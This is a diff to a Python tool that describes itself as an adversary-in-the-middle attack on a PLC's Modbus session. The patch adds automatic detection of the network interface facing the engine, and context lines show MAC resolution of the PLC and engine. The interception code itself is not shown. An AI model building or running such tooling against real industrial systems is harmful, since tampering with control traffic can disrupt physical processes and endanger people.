@@ -258,8 +258,31 @@ def log_line(fh, event, **fields):
     fh.flush()
 
 
+def iface_towards(ip, routes="/proc/net/route"):
+    """This host's interface on the link that holds ``ip``: the on-link route
+    (no gateway) with the longest mask whose network contains it. The kernel
+    prints addresses and masks as host-order words of the network bytes."""
+    target = struct.unpack("=I", socket.inet_aton(ip))[0]
+    best = None
+    with open(routes) as f:
+        next(f)  # the header
+        for line in f:
+            cols = line.split()
+            iface, dest, gateway, mask = (
+                cols[0],
+                int(cols[1], 16),
+                int(cols[2], 16),
+                int(cols[7], 16),
+            )
+            if gateway == 0 and target & mask == dest and (best is None or mask > best[1]):
+                best = (iface, mask)
+    if best is None:
+        raise RuntimeError(f"no interface of this host is on the link of {ip}")
+    return best[0]
+
+
 def run(args):
-    link = Link(args.iface)
+    link = Link(args.iface or iface_towards(args.engine_ip))
     if args.plc_ip == "auto":
         args.plc_ip = link.find_client(args.engine_ip, args.port)
     plc_mac, engine_mac = link.resolve(args.plc_ip), link.resolve(args.engine_ip)
@@ -328,7 +351,11 @@ def run(args):
 
 def main():
     ap = argparse.ArgumentParser(description="Adversary in the middle of the PLC's Modbus session")
-    ap.add_argument("--iface", default="eth1", help="this host's interface on the OT link")
+    ap.add_argument(
+        "--iface",
+        default=None,
+        help="this host's interface on the OT link (default: the one the engine is reached on)",
+    )
     ap.add_argument("--plc-ip", default="auto", help="the PLC, or 'auto' to find it by listening")
     ap.add_argument("--engine-ip", required=True)
     ap.add_argument("--port", type=int, default=reg.MODBUS_PORT)
